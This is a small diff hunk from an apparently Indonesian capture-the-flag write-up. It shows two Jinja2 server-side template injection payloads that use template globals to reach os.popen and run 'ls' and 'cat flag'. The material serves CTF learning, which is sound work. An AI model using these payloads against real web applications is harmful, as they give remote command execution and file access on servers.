@@ -90,11 +90,13 @@ metode peretas untuk menyerang sistem dengan celah keamanan yang tidak teridenti
 ### 1. SSTI 1
 
 ls python code
+
 ```code
 {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read()}}
 ```
 
 cat flag python code
+
 ```code
 {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read()}}
 ```
